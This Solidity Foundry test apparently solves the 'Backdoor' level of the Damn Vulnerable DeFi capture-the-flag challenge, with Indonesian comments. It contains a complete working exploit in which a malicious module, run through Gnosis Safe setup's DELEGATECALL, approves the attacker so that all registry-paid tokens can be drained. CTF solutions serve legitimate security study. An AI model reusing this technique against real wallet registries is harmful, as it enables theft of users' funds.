// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

// Kontrak jahat: dipanggil via DELEGATECALL dari GnosisSafe.setup
// (setupModules) saat wallet dibuat — kodenya berjalan dalam konteks
// Safe yang baru dibuat, sehingga approve() ini diberikan OLEH Safe
// tersebut (msg.sender yang dilihat token = alamat Safe), bukan oleh
// penyerang. Registry baru membayar 10 DVT ke Safe SETELAH setup,
// jadi approval sudah terpasang sebelum dana masuk.
contract BackdoorAttacker {
    function attack(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // Root cause: GnosisSafe.setup() menjalankan DELEGATECALL ke
        // alamat `to` arbitrer dengan `data` arbitrer (setupModules) —
        // kode itu berjalan dalam konteks Safe yang baru dibuat, dengan
        // identitas Safe. Registry TIDAK memeriksa `to`/`data` sama
        // sekali: proxyCreated hanya mengecek factory, master copy,
        // selector setup, threshold 1, 1 owner, dan owner adalah
        // beneficiary. Jadi penyerang membuatkan wallet untuk KEEMPAT
        // user, dengan `to` = kontrak jahat yang approve() tak terbatas
        // ke penyerang — lalu registry membayar 10 DVT ke tiap wallet,
        // dan penyerang menarik semuanya via transferFrom.
        BackdoorAttacker attackerContract = new BackdoorAttacker();

        vm.startPrank(attacker);
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(attackerContract),
                abi.encodeWithSignature(
                    "attack(address,address)",
                    address(dvt),
                    attacker
                ),
                address(0),
                address(0),
                0,
                address(0)
            );

            walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                i, // saltNonce berbeda per user
                walletRegistry
            );
        }

        // Semua wallet sudah terisi 10 DVT + sudah approve attacker
        // saat setup -> tarik semuanya.
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            dvt.transferFrom(wallet, attacker, 10e18);
        }
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
